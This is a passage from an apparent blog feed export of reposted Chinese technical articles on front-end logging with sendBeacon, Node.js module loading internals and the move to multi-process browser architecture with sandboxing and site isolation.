func.apply(scope || &#123;&#125;, Array.prototype.slice.call(arguments, 0)); &#125; &#125;&#125; 我们所做的一切其实就是将依赖添加到作用域。这样做的好处是，开发人员不用再写依赖性参数；它们已经是函数作用域的一部分。 123456var doSomething = injector.resolve([&apos;service&apos;, &apos;router&apos;], function(other) &#123; expect(this.service().name).to.be(&apos;Service&apos;); expect(this.router().name).to.be(&apos;Router&apos;); expect(other).to.be(&apos;Other&apos;);&#125;);doSomething(&quot;Other&quot;);]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端日志上报的新姿势“Beacon”]]></title>
    <url>%2F2020%2F02%2F11%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E6%97%A5%E5%BF%97%E4%B8%8A%E6%8A%A5%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF%E2%80%9CBeacon%E2%80%9D%2F</url>
    <content type="text"><![CDATA[转载自知乎网络，原文链接：https://zhuanlan.zhihu.com/p/48171879 在前端应用越来复杂的今天，为了监控前端应用是否正常运行，通常会在前端收集一些错误与性能等数据，最终我们会将这些数据上报到服务端。 上报的方式有很多，理论上我们只要能把数据发给服务端就行了。在浏览器中可以发送请求的方式非常多，包括不限于：xhr、fetch、script标签、img标签、link标签、CSS背景图等。 不同的上报方式之间存在很大的差异。目前主流的上报方式是利用img标签的src属性发送请求，例如： 1(new Image).src = `/haopv.gif?a=xx&amp;b=xxx` 因为日志上报不需要响应处理，只需要把数据发过去就行。并且大部分接收日志的服务器地址与业务方可能不是一个部门，甚至可能不是一个公司，所以会涉及到跨域问题。使用img标签的src属性既可以把数据发送给服务端又不需要接收响应，同时解决了跨域问题，所以是目前比较受欢迎的日志上报实现方式。 但是这样就真的没问题了么？ 日志上报并不是应用的主要功能逻辑，也就是说，日志上报是低优先级的，它不应该与其他高优先级操作（例如：获取关键资源、输入响应、运行动画等）去竞争网络与计算资源（通俗的说就是日志上报行为不应该影响业务逻辑，不应该占用业务计算资源）。但是这种单向请求又负责传递应用的错误与性能数据，所以我们必须要确保它会被交付到服务端。 通常，为了提高交付率，我们会选择立即交付每个收集到的数据，而不是合并与推迟交付。延迟传递可能意味着请求没有足够的时间来成功完成，这可能导致重要的应用数据丢失。 这就意味着我们的交付行为有可能会被插入到正在忙碌工作的事件循环中，从而抢占了其他高优先级的任务的资源，因为JS是单线程的。这有可能会损害用户体验。 我们如何确保日志数据会被交付的同时，尽可能地减少与其他关键操作的资源争用呢？答案是信标（Beacon）。 信标（Beacon）信标（Beacon）可以异步与非阻塞的数据传输，从而最大限度地减少与其他关键操作的资源争用，同时它可以确保这些请求一定会被处理并将其传递到服务端： 信标请求优先避免与关键操作和更高优先级的网络请求竞争。 信标请求可以有效地合并，以优化移动设备上的能量使用。 保证页面卸载之前启动信标请求，并允许运行完成且不会阻塞请求或阻塞处理用户交互事件的任务。 信标的使用非常简单： 1234var data = JSON.stringify(&#123; name: &apos;Berwin&apos;&#125;);navigator.sendBeacon(&apos;/haopv&apos;, data) 参数 url：上报的目标地址 data：被上报的数据 返回值（Return Value）：sendBeacon方法被执行后返回一个布尔值，true代表用户代理成功地将信标请求加入到队列中，否则返回false。 用户代理对通过信标发送的数据量进行限制，以确保请求被成功传递到服务端，并且对浏览器活动的影响降到最小。如果要排队的数据量超出了用户代理的限制，sendBeacon方法将返回false，返回true代表浏览器已将数据排队等待传递。然而，由于实际数据传输是异步的，所以此方法不提供任何关于数据传输是否成功的信息。 虽然信标得到了很高的支持度，但还是无法在所有浏览器中使用，所以如果您想使用信标上报前端日志，一些特征检测是必要的。 还有一个需要注意的是，通过信标发送的请求，请求方法均为POST，且不支持修改。 总结日志上报在生产环境下不仅仅是把请求发出去。日志上报并不是主要逻辑所以优先级很低，为了最佳的用户体验，在考虑避免占用业务计算资源和避免竞争业务网络请求的同时我们还要保证数据一定会交付到服务端，最好的方式是尽可能的使用信标（Beacon）。]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node 模块加载机制]]></title>
    <url>%2F2020%2F02%2F05%2FNode.js%2Fnode%20%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[转载自掘金网络，原文链接：https://juejin.im/post/5d84456851882556f33d5fb0 先执行一段代码a/index.js 1modulex.exports = 1; useA.js 1234const a = require(&apos;./a&apos;);const express = require(&apos;express&apos;);console.log(module);console.log(global.require); 执行useA.js 12345678910111213141516171819202122Module &#123; id: &apos;.&apos;, exports: &#123;&#125;, parent: null, filename: &apos;/Users/mac/Desktop/share/demo1/useA.js&apos;, loaded: false, children: [ Module &#123; id: &apos;/Users/mac/Desktop/demo/a.js&apos;, exports: &apos;1&apos;, parent: [Circular], filename: &apos;/Users/mac/Desktop/demo/a.js&apos;, loaded: true, children: [], paths: [Array] &#125; ], paths: [ &apos;/Users/zhangxk/Desktop/demo/node_modules&apos;, &apos;/Users/zhangxk/Desktop/node_modules&apos;, &apos;/Users/zhangxk/node_modules&apos;, &apos;/Users/node_modules&apos;, &apos;/node_modules&apos; ] &#125;undefined 通过上面的代码我们可以想到几个问题 useA.js是如何找到a/index.js和express的 a.js的module.exports在useA.js中是如何获取到的 console.log(global.require); 输出的是undefined，说明require不挂载在全局对象上，那为什么可以使用 模块中并没有申明module变量，为什么可以输出一个对象 本篇文章就通过这四个问题，来逐渐解析node模块化机制 模块查找规则 首先我看一下require()函数在node内部是如何定义的 12345678function require(path) &#123; try &#123; exports.requireDepth += 1; return mod.require(path); &#125; finally &#123; exports.requireDepth -= 1; &#125;&#125; mod.require 1234Module.prototype.require = function(id) &#123; // ... return Module._load(id, this, /* isMain */ false);&#125;; Module._load函数 12345678910111213141516171819202122232425262728293031Module._load = function(request, parent, isMain) &#123; //获取文件路径 var filename = Module._resolveFilename(request, parent, isMain); // 尝试从缓存中读取模块 var cachedModule = Module._cache[filename]; if (cachedModule) &#123; updateChildren(parent, cachedModule, true); return cachedModule.exports; &#125; // 如果是原生模块返回 if (NativeModule.nonInternalExists(filename)) &#123; debug(&apos;load native module %s&apos;, request); return NativeModule.require(filename); &#125; // 第三方模块创建模块对象 var module = new Module(filename, parent); if (isMain) &#123; process.mainModule = module; module.id = &apos;.&apos;; &#125; // 缓存模块 Module._cache[filename] = module; // 加载模块 tryModuleLoad(module, filename); // 返回模块的exports return module.exports;&#125;; Module._resolveFilename 如何查找到文件路径的 123456789101112131415161718Module._resolveFilename = function(request, parent, isMain, options) &#123;// 如果是node原生模块，直接返回模块名称 if (NativeModule.nonInternalExists(request)) &#123; return request; &#125; var paths; if (typeof options === &apos;object&apos; &amp;&amp; options !== null &amp;&amp; // ... &#125; else &#123; // 获取模块可能出现的位置 paths = Module._resolveLookupPaths(request, parent, true); &#125; // 精确查找模块位置 var filename = Module._findPath(request, paths, isMain); return filename;&#125;; Module._resolveLookupPaths粗略查找文件可能出现的范围 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758Module._resolveLookupPaths = function(request, parent, newReturn) &#123; // 判断是不是以./或者../引入的模块 if (request.length &lt; 2 || request.charCodeAt(0) !== CHAR_DOT || (request.charCodeAt(1) !== CHAR_DOT &amp;&amp; request.charCodeAt(1) !== CHAR_FORWARD_SLASH)) &#123;// 将本机NODE_PATH全局路径、用户根目录下的.node_modules和.node_libraries组成的数组赋值给paths var paths = modulePaths; if (parent) &#123; if (!parent.paths) paths = parent.paths = []; else // 将父级paths属性 paths = parent.paths.concat(paths); &#125; const base = path.basename(parent.filename); var parentIdPath; if (base.length &gt; indexLen) &#123; var i = 0; for (; i &lt; indexLen; ++i) &#123; if (indexChars[i] !== base.charCodeAt(i)) break; &#125; if (i === indexLen) &#123; // We matched &apos;index.&apos;, let&apos;s validate the rest for (; i &lt; base.length; ++i) &#123; const code = base.charCodeAt(i); if (code !== CHAR_UNDERSCORE &amp;&amp; (code &lt; CHAR_0 || code &gt; CHAR_9) &amp;&amp; (code &lt; CHAR_UPPERCASE_A || code &gt; CHAR_UPPERCASE_Z) &amp;&amp; (code &lt; CHAR_LOWERCASE_A || code &gt; CHAR_LOWERCASE_Z)) break; &#125; if (i === base.length) &#123; // Is an index module parentIdPath = parent.id; &#125; else &#123; // Not an index module parentIdPath = path.dirname(parent.id); &#125; &#125; else &#123; // Not an index module parentIdPath = path.dirname(parent.id); &#125; &#125; else &#123; // Not an index module parentIdPath = path.dirname(parent.id); &#125; var id = path.resolve(parentIdPath, request); // make sure require(&apos;./path&apos;) and require(&apos;path&apos;) get distinct ids, even // when called from the toplevel js file if (parentIdPath === &apos;.&apos; &amp;&amp; id.indexOf(&apos;/&apos;) === -1) &#123; id = &apos;./&apos; + id; &#125; var parentDir = [path.dirname(parent.filename)]; return (newReturn ? parentDir : [id, parentDir]);&#125;; 精确查找文件路径 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374Module._findPath = function(request, paths, isMain) &#123; if (path.isAbsolute(request)) &#123; paths = [&apos;&apos;]; &#125; else if (!paths || paths.length === 0) &#123; return false; &#125; var cacheKey = request + &apos;\x00&apos; + (paths.length === 1 ? paths[0] : paths.join(&apos;\x00&apos;)); // 尝试从缓存路径中获取路径 var entry = Module._pathCache[cacheKey]; if (entry) return entry; var exts; var trailingSlash = request.length &gt; 0 &amp;&amp; request.charCodeAt(request.length - 1) === CHAR_FORWARD_SLASH; if (!trailingSlash) &#123; trailingSlash = /(?:^|\/)\.?\.$/.test(request); &#125; // For each path for (var i = 0; i &lt; paths.length; i++) &#123; // Don&apos;t search further if path doesn&apos;t exist const curPath = paths[i]; if (curPath &amp;&amp; stat(curPath) &lt; 1) continue; var basePath = path.resolve(curPath, request); var filename; // 调用internalModuleStat方法来判断文件或者文件夹是否存在，文件存在返回0，文件夹存在返回1，文件或文件夹不存在返回-2 var rc = stat(basePath); if (!trailingSlash) &#123; if (rc === 0) &#123; // File. if (!isMain) &#123; if (preserveSymlinks) &#123; filename = path.resolve(basePath); &#125; else &#123; filename = toRealPath(basePath); &#125; &#125; else if (preserveSymlinksMain) &#123; filename = path.resolve(basePath); &#125; else &#123; filename = toRealPath(basePath); &#125; &#125; if (!filename) &#123; // try it with each of the extensions if (exts === undefined) exts = Object.keys(Module._extensions); // 一次尝试加载.js .json .node结尾的文件 filename = tryExtensions(basePath, exts, isMain); &#125; &#125; // if (!filename &amp;&amp; rc === 1) &#123; // Directory. // try it with each of the extensions at &quot;index&quot; if (exts === undefined) exts = Object.keys(Module._extensions); // 尝试加载文件夹下package.json 配置的main字段对应的文件路径 filename = tryPackage(basePath, exts, isMain); if (!filename) &#123; // 尝试获取文件夹下的index.js filename = tryExtensions(path.resolve(basePath, &apos;index&apos;), exts, isMain); &#125; &#125; if (filename) &#123; // 缓存路径 Module._pathCache[cacheKey] = filename; return filename; &#125; &#125; return false;&#125;; 现在回答第一个问题，node是如何找到模块的阶段1. 粗查阶段 如果是node核心模块，就直接返回模块名称 如果是引入的第三方npm模块，会返回父级所在文件夹下的node_modules，父父级所在文件夹下的node_modules，依次递归，一直到/node_modules和用户名下的.node_modules以及全局环境变量配置的全局安装的模块文件夹组成的数组 如果是相对路径引入的模块，会将相对路径和父级路径之间进行一个path.resolve()，然后返回 阶段2. 精确查找，获取文件绝对路径以require(‘express’)为例 先尝试加载node_modules/express，这种没有扩展名的文件是否存在 尝试按照扩展名规则查找，依次判断node_modules文件夹下.js .json .node结尾的文件名为express的文件是否存在，返回文件的绝对路径 判断node_modules/express文件夹下的package.json是否存在，如果存在，返回main字段指定的文件的绝对路径 判断node_modules/express/index.js是否存在，存在返回对应文件绝对路径 解析模块 Module._resolveFilename(request, parent, isMain);获取到文件绝对路径之后，执行tryModuleLoad(module, filename); 尝试加载模块 tryModuleLoad 直接调用Module.prototype.load函数 1234567891011Module.prototype.load = function(filename) &#123; this.filename = filename; // 以文件绝对路径为基准，初始化node_modules this.paths = Module._nodeModulePaths(path.dirname(filename)); // 如果文件没有扩展名，初始化为.js结尾的 var extension = path.extname(filename) || &apos;.js&apos;; // 调用扩展名对应的解析规则 if (!Module._extensions[extension]) extension = &apos;.js&apos;; Module._extensions[extension](this, filename); this.loaded = true;&#125;; .js .json .node结尾的文件，node的解析规则 12345678910111213141516171819// Native extension for .jsModule._extensions[&apos;.js&apos;] = function(module, filename) &#123; var content = fs.readFileSync(filename, &apos;utf8&apos;); module._compile(stripBOM(content), filename);&#125;;// Native extension for .jsonModule._extensions[&apos;.json&apos;] = function(module, filename) &#123; var content = fs.readFileSync(filename, &apos;utf8&apos;); try &#123; module.exports = JSON.parse(stripBOM(content)); &#125; catch (err) &#123; err.message = filename + &apos;: &apos; + err.message; throw err; &#125;&#125;;// Native extension for .nodeModule._extensions[&apos;.node&apos;] = function(module, filename) &#123; return process.dlopen(module, path.toNamespacedPath(filename));&#125;; json会直接读取文件内容，JSON.parse直接输出，.node文件会使用process.dlopen()执行文件，这两种文件处理比较简单，这里详细分析.js结尾的文件 module._compile执行js文件编译 12345678910111213141516Module.prototype._compile = function(content, filename) &#123; // ... // 将模块代码 var wrapper = Module.wrap(content); // 将字符串转换成可执行的js代码 var compiledWrapper = vm.runInThisContext(wrapper, &#123; filename: filename, lineOffset: 0, displayErrors: true &#125;); // ... // 执行函数 result = compiledWrapper.call(this.exports, this.exports, require, this, filename, dirname); return result;&#125; Module.wrap通过字符串拼接，在代码外包含一个函数 1234567Module.wrap = function(script) &#123; return Module.wrapper[0] + script + Module.wrapper[1];&#125;;Module.wrapper = [ &apos;(function (exports, require, module, __filename, __dirname) &#123; &apos;, &apos;\n&#125;);&apos;]; 调用vm.runInThisContext将字符串转为可执行的js函数 compiledWrapper.call(this.exports, this.exports, require, this, filename, dirname); 执行函数，module.exports, require函数, module作为三个参数，在函数内部给module.exports进行赋值，模块内部可以使用require函数加载模块，可以获取到module变量，描述当前模块的信息， 模拟实现require函数1234567891011121314151617181920212223242526272829303132333435363738const path = require(&apos;path&apos;);const fs = require(&apos;fs&apos;);const vm = require(&apos;vm&apos;);function Module(id) &#123; this.id = id; this.exports = &#123;&#125;;&#125;Module._extensions = &#123;&#125;;let wrapper = [ &apos;(function(exports, module, require, __dirname, __filename)&#123;&apos;, &apos;&#125;)&apos;]Module._extensions[&apos;.js&apos;] = function(module) &#123; let script = fs.readFileSync(module.id, &apos;utf8&apos;); let fnStr = wrapper[0] + script + wrapper[1]; let fn = vm.runInThisContext(fnStr); fn.call(module.exports, module.exports, module, MyRequire);&#125;Module.prototype.load = function() &#123; let ext = path.extname(this.id); Module._extensions[ext](this);&#125;function MyRequire(filePath) &#123; let absPath = path.resolve(__dirname, filePath); let module = new Module(absPath); module.load(); return module.exports;&#125;let a = MyRequire(&apos;./test.js&apos;);console.log(a);]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器进程架构的演化]]></title>
    <url>%2F2020%2F02%2F05%2FWeb%E5%89%8D%E7%AB%AF%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84%E7%9A%84%E6%BC%94%E5%8C%96%2F</url>
    <content type="text"><![CDATA[转载自掘金网络，原文链接：https://juejin.im/post/5df1e10cf265da33f34b3243 前言 曾经你用 IE6或IE7 或者 firefox 的时候有遇到一个插件崩溃，而你打开的一系列页面全部崩溃的场景么？😰 曾经你遇到过打开浏览器或某些页面总是弹出很多你不想打开的恶意窗，要一个一个手动叉掉的情况吗？😤 曾经在你打开某个页面由于某种原因整个浏览器就卡住，连关闭按钮都点不动的时候，你是只能强制关掉整个浏览器么？🤔 如果上述情况你都遇见过，那我们今天就有得聊了。如果没遇到也没关系，今天的内容也会让你拓展一下视野，当你真正遇到的时候，不至于一头雾水。 今天的主题是《浏览器进程架构的演化》，可能你会问了，什么是浏览器进程架构。其实很简单，架构指的是一个软件的各个方面的设计，那浏览器进程架构你就可以理解为 浏览器是怎么设计其进程的操作和管理方式的 我们会将各种浏览器放到一起来聊一聊这些 浏览器在历史发展过程中，其进程架构做了哪些调整？为什么这样调整？解决了哪些问题？ 相信看完这篇文章，能让你明白开头提出的三个问题是怎么回事儿，对你以后遇到的其它问题也给出一个思考方向。 好了，既然要说进程架构的演化，那你真的了解了进程是怎么回事儿么？与线程之间有啥关系？我们来简单的过一遍 了解进程和线程我们一般使用电脑的时候都会打开多个程序同时运行，比如同时打开了音乐程序放着歌，又打开了文档程序写记录，还开了一个下载程序下载电影。但 CPU其实在某一个特定时刻是只能执行一个程序的（先不考虑多核），那么我们的电脑又是如何同时运行多个程序的呢？ 答案就是 进程。进程是操作系统中的概念，操作系统在面对同时处理多个程序的时候，将应用程序抽象为进程来运行。这样一来，操作系统就可以根据一定的规则快速的将CPU执行时间这一宝贵的资源分配给不同的进程去使用，因为切换分配的速度很快，所以看起来就像是多个应用程序同时在运行一样。 但是只有进程还不够，往往一个应用程序整体在执行的时候会存在多个子任务的情况，就像一个在线音乐程序在运行的时候，需要同时运行网络加载的子程序加载音乐流，还要运行音乐数据流的编解码子程序，还会运行音乐界面的UI程序等。因而操作系统又在进程里面划分出了 线程 的概念。有了线程，一个应用程序就可以同时管理自己的多个子任务了。从这里我们还要更新一个概念，CPU在某个特定时刻其实只能执行某个线程 。 我们再来整体过一遍一个程序的运行。当你运行一个应用程序的时候，操作系统会把你的应用程序封装为一个进程来运行。因为程序运行是需要内存的，所以在分配线程的时候也会同时给你分配一块儿对应的内存，用来存储程序代码、数据和文件资源等。当你的进程需要执行子任务的时候，就可以创建新的线程来执行。 这里我们需要了解几个特性： 线程共享进程资源。进程是操作系统分配资源的基本单位，所以进程所需要的系统资源都是操作系统给的，而里面的线程要用资源的时候只能共享进程所拥有的资源。这种资源包括内存空间，也包括操作系统的权限。 一个线程崩溃，整个进程跟着崩。 其实很好理解，一个程序运行过程中，如果某个线程出错了，因为内存是共享的，那如果产生了错误的数据，整个进程最终执行结果也很可能是错的。所以操作系统就直接全部干掉了。 进程之间相互隔离，通过IPC进行通信。 虽然我们一直说一个进程就是一个应用程序，但有的时候一个应用程序也有可能会启动子进程，进程之间的数据呢又是隔离开的，各自为战。要同步某些数据内容，就可以通过某种进程间通信（IPC）的手段来进行。（IPC是一个统称，指可用于不同进程之间通信的手段，这里无需细究） 早期的单进程浏览器早期的浏览器包括IE7及之前的IE浏览器，Firefox浏览器都是使用的单进程的浏览器架构，也就是说整个浏览器程序都是在一个进程中运行的。不同类型的浏览器的实际进程架构肯定是有一定的差异的，为了描述方便，我们都简化为下面的这张图来说明一下单进程浏览器存在的问题。 在这样的进程架构里，整个进程除了要运行浏览器窗口，下载资源，其中的页面线程还要同时承担了页面渲染、JS执行以及各种插件的运行。这样的一个进程运行起来在我们现在看来其实是有点刀尖上跳舞的感觉。因为这样来运行包含很多页面甚至很多插件的和功能的浏览器，会及其的不稳定，不流畅和不安全 先来看看为啥不稳定。我们回到最开始提的问题，曾经你有用IE6、7或者Firefox的时候，一个插件或页面崩的时候，整个页面崩的情况吗？ 现在听起来是不是有点熟悉，可能你心里已经有答案了吧。我们刚才谈到，线程崩溃，整个进程也会全部崩掉。在单进程架构的浏览器里，我们的页面渲染引擎、插件程序，还有像IE里有很多动态链接库的程序都是可能出错的❌，那么不管这些程序在进程中的哪个线程里面运行，其实只要有一个出了个错，那么整个浏览器就挂掉了。这就是我们说的不稳定。 再来看看不流畅。我们已经知道CPU其实在某个时间点只能执行某个进程中的某一条线程。那么当我们一个页面线程中既包含了页面的渲染又包含了JS的执行，还有各种插件执行的时候。假设我们JS代码中写了一个死循环的任务，那可想而知，整个浏览器中的其他任务就都没法执行下去了——也就卡住了。那么即使我们不那么暴躁，只是我们的JS或者插件程序需要一直运行一些东西，当你页面正在用JS执行动画的时候，CPU突然被插件进程抢过去执行其他任务了，那你的动画效果怕不是卡得你心慌 😫 最后说一下不安全的问题，这就要用到另一条我们刚提过的特性了——线程共享进程资源。在windows上用过杀毒软件和各种安全卫士软件的应该对 “恶意插件” 这个词不陌生吧。插件这种东西本来是用来便捷的扩展浏览器功能特性的，比如我们最常见的Adobe Flash Player这个插件，以前几乎人手必备。当浏览器和插件的程序在一个页面里面运行的时候，因为进程的内存是被共享的，因而插件就能获取到浏览器运行过程中的数据，以及拥有和浏览器同等的系统权限。那么当你的系统感染了恶意插件，在浏览器运行的过程中，这个插件就可以记录你输入到网页的密码，给你弹出各种窗口，打开多个网页等等。现在你知道曾经你手动一个一个叉掉的那些无故打开的页面是怎么来的吧，同时你也应该了解到当初QQ号被盗的一种可能的原因了吧。 这就是早期的单进程浏览器存在的问题，不稳定、不流畅和不安全。而这一切都是由于把所有的东西像揉面团一样的放到一起所产生的问题，职责是混淆不清的、权限是一给全给的、还有 “一人放火全家遭殃” 的风险。 向多进程架构演化可能是由于早期的网页功能特性都比较简单，不像现在这样需要非常丰富的功能特性（比如：Canvas、WebGL、Webworker 这些东西），那个时候常规来说单进程就足够了。曾经前端的开发工作还没那么复杂的时候，页面很多都是后端直接就写了。现在有了前端开发工程师这样的一个职位，而且有了更加系统和全面的前端开发工作流，前端的重要性和复杂性都在不断提升。除了单进程浏览器自身存在的一些问题，面对时代的变革，前端的崛起，浏览器若还停留在原地肯定是行不通的，必然无法支撑新的技术的发展，何况单进程本身带来的问题也是需要解决的。 所谓多进程浏览器当然就是将浏览器的各种不同类别的任务拆分出来，放到多个不同的进程中去执行。这里会用到一个关键的安全技术，就是Sandox。 Sandbox（沙盒）\可以看做就是*一个被限制了权限的进程*，一个稍微严格的定义是这样的 沙箱技术按照安全策略来限制程序对系统资源的使用，进而防止其对系统进行破坏，其有效性依赖于所使用的安全策略的有效性 也就是说沙盒限制了多少权限是根据你的安全策略来的，它能防止系统被恶意破坏，提供了一定的安全性，这也是我们上面提到的 “不安全” 这一个问题的解决方案的一环。具体的沙盒的实现方法呢在不同的操作系统上都是有差异的，毕竟进程是操作系统提供的，这不是我们的重点，就此打住。 接着我们一起来看一下Chrome、IE 和 Firefox这三款浏览器是如何演化自身到多进程的一个架构方案的？ Chrome的多进程架构Google Chrome浏览器最早是在2008年发布的，比起IE这种老牌浏览器，现在看来算是后起之秀。不过这个后起之秀并非只是突兀的来抢占浏览器市场份额的，这一点从 Chrome一开始就是基于多进程架构 可见端倪。 在Chrome的多进程架构中，包含这样几种进程 浏览器主进程。整个浏览器的主要进程，其他几个进程都是这个进程的子进程，由它来管理和调配；同时你所看到的浏览器的整个窗口，包含地址输入栏，书签栏这些东西也都是它来展示的； 渲染进程。一般来说一个Tab标签页面一个渲染进程（对于不一般的情况可以了解Site Isolation策略）；每个渲染进程中会运行Blink布局引擎，V8 JavaScript执行引擎等，单独服务于一个Tab标签页；运行在沙盒中无法访问系统资源。 插件进程。一个插件单独存在于一个进程当中，同时为了安全性，运行在沙盒中限制其权限。 网络进程。发起网络请求访问。 GPU进程。处理GPU渲染方面的任务。 可以看得出，chrome这样的多进程设计，将原本揉到一起的各种任务根据职责的不同分拆了出去，极大的减轻了单进程的执行负担。（其实，最早的chrome进程设计其实没有单独的网络进程和GPU进程的，都是放到浏览器主进程中的） 当你打开浏览器的时候，默认先启动浏览器主进程，展示了整个浏览器窗口和地址栏等一系列的基础UI界面。然后主进程启动其他的各项子进程。当你附带要运行插件的时候，就给对应的插件分配一个进程，如果没有就不分配。当你打开了一个Tab标签页的时候，又会根据这个标签页创建一个渲染进程，用于标签页内页面的渲染和脚本的执行。当然，如果你的页面使用了WebGL或者CSS3动画之类的需要GPU做渲染的东西，Chrome也给了一个统一的CPU进程来维护这些渲染任务。你的html页面或者js脚本是需要从服务器下载到本地才能被渲染进程使用的，那我们就单独有个网络进程来处理这些和网络交互相关的任务。因此，一个基本的多进程架构就这样呈现了出来。 其中我们需要注意到几点： 其他各个进程都是由浏览器主进程启动和管理的，进程间通过IPC进行数据通信。 渲染进程和插件进程可能不止一个，根据要渲染的页面和插件数而定。 解决问题了么那这样解决了我们单进程浏览器中出现的问题么？当然是解决了。 首先我们看不稳定的问题，不稳定是由于插件或者渲染引擎之类的出错导致的，现在不管是插件还是页面的渲染工作都是单独在各自的线程中运行的，如果某个插件出错了，那最多是那个插件不能用，其他页面的浏览和其他的插件都会照常运行。如果是某个渲染进程出错，那也只是那个页面看不了了而已，其他页面也不会受到影响，更别说把整个浏览器搞崩溃。说到这里，你是不是又想起了曾经某个页面显示“崩溃了”，然后你关闭那个Tab标签然后重新打开一下就好了；又或者曾经浏览器告诉你你的Flash插件崩溃了，你想看有些视频网站看不了，但是网页还是正常的，重启浏览器之后，Flash又恢复了。🤓 然后再是不流畅。在页面、插件和浏览器三种各自分别有各自的线程的情况下，插件的执行不流畅只会影响到插件自身，页面的无论渲染还是js的执行，不流畅那也只是那一个页面。若是放在单进程浏览器时代，我们说的不流畅那就是不管任何页面还是任何一个插件引起的，会导致整个浏览器窗口、所有页面、所有插件的不流畅。多进程的方式，让这种“共患难”的模式不复存在。🤣 最后再谈不安全。多进程对安全问题的处理主要靠两方面：1.渲染进程和插件进程运行在沙盒环境中；2.相互隔离的进程数据不共享。拆分成多线程的形式让我们能够对每个单独的页面和每个单独的插件加上沙盒限制，剥除了渲染进程的文件系统权限，网络访问权限等；对于插件进程，也无法对某个页面全权操控，或者对浏览器主进程数据任意访问和修改，插件自身能做什么也严格受到限制。如果他们需要某种操作，比如网络请求或者文件访问怎么办呢？通过IPC告知浏览器主进程，主进程来决定给不给你权限以及给你哪些权限。是不是又想起了在chrome中打开某个地图网站，浏览器问你“是否允许网站获取你的位置信息”，又或者 “是否允许网站使用摄像头” 😇 做一个小实验现在你可以跟着一起打开Chrome 【设置】=&gt; 【更多工具】=&gt; 【任务管理器】看看你的Chrome运行了哪些进程。 这里我直接打开Chrome浏览器，然后打开了两个Tab，一个是百度一个是Google。我们可以看到这里的任务管理器里显示了我们的浏览器运行了哪些进程，包括进程的名称，内存占用大小，CPU使用率，网络和进程ID等信息（实际你可以在这个标头点击鼠标右键列出更多参考信息）。和我们刚才说的差不多，我们无论如何得有一个浏览器主进程，然后有一个GPU进程渲染一些图形相关的东西，还有一个Network 的网络进程，另外两个标签页分别就是两个渲染进程。这个时候我想模拟一下当某个渲染进程崩溃会出现啥，点击百度这这个标签页，然后点击右下角的结束进程。你是不是也和我一样，出现了下面的页面呢。 你应该也注意到了整个浏览器仍然是稳定运行的，Google的那个页面也是正常的，崩掉的只有百度的这一个页面而已。如果你的浏览器里运行了插件，你也可以试着关掉插件进程试试。 这个小实验是否对 “曾经在你打开某个页面由于某种原因整个浏览器就卡住，连关闭按钮都点不动的时候，你是只能强制关掉整个浏览器么？” 这个问题于你有所启发呢？ 站点隔离(Site Isolation)对于Chrome的多进程架构还有一个必然需要谈到的东西，就是站点隔离 Site Isolation 策略。我们之前说的是一个标签页一个渲染进程，但实际情况下如果真的每个便签页都是一个渲染进程的话，那还是有点浪费进程资源的。另一个方面有个很特殊的问题就是如果只是一个标签页一个渲染进程的话，那如果存在一个标签页，里面有一个iframe引用了另一个页面，那这两个不同网站的页面就会在同一个进程中去渲染和执行脚本。这样来看，Tab的进程隔离并不能对站点做隔离。而且由于已知存在的CPU级别的漏洞Spectre和Meltdown（它们可以让程序访问到不属于当前进程的数据），从安全性上来说，Chrome也必须对“一个标签页一个渲染进程”的策略做调整。 这里的调整策略就是站点隔离策略。所谓站点隔离，就是指同一个域下的内容，会放在同一个渲染进程中进行渲染。对于刚才我们提到的一个Tab标签页中存在iframe引入其他网页的情况，标签页自身肯定是一个渲染进程，但对于内部的iframe，如果iframe是和标签页属于同一域，那就共用渲染进程，否则会给这个iframe一个单独的渲染进程。比如下面这张图中的 a.com、b.com和c.com 的页面就是单独各自都有一个渲染进程。而如果 b.com你将其换成 a.com 下的某个其他页面，那他们就会使用同一个渲染进程了。 其实站点隔离最重要的作用还是对于安全性的要求，其次才是可以节省那么一点内存。 这里给各位提供一个测试这个特性的网站: csreis.github.io/tests/cross… 。 在Chrome中打开，同时打开上面我们实验的时候打开过的【任务管理器】，点击测试网站的按钮，观察观察会发生什么。（注：属于同一个进程的时候，只有表示页面的信息行，没有进程ID ）。😎 这里其实站点隔离策略也是适用于从一个页面里打开的新的Tab页的，比如我先打开得到招聘页的网站 www.igetget.com/join/work 点击右上角 “了解我们”，这个时候会打开一个新的Tab，然后再去【任务管理器】里面查看，你会发现，新打开的Tab页是没有进程ID的，当你点击这个进程的时候，它会选中这两个便签页行，其实也就是说它们是用的同一个进程。（注意，这里我们新打开的Tab和原始页面属于同一个域） IE的多进程架构IE浏览器从IE8开始其进程架构就变成多进程的了。下图就是IE8的进程架构示意图。看起来是不是有点慌乱，我们来理一下。 在说IE的多线程之前，我们需要先简单了解一下DLL这个东西，DLL叫做动态链接库，可以看做是某些个特定功能实现的代码库，在windows上编程要调用一些windows系统的功能的时候，就可以直接通过调用一些DLL库给我们提供对应的功能。 IE的主要进程其实就两类： 框架进程。 Tab进程。 框架进程就是我们图中最上方的那个红色区域表示的东西，它呢其实主要就是一个UI进程，底层使用了 BrowseUI.dll 这个DLL库，用来构建用户界面，包括工具栏、菜单一类的东西。框架进程可以创建多个Tab进程，Tab进程与框架进程之间的通信是用了ALPC（高级本地调用）的机制，这种机制是windows内核中常用的，感兴趣可以自己再去了解。 Tab进程是用来渲染页面，执行JS代码（当然这里可能是JScript和VBscript，对于IE8至少不是标准的Ecmascript），以及执行一个IE插件程序。Tab进程里会调用到有关历史记录的 ShDocVw.dll 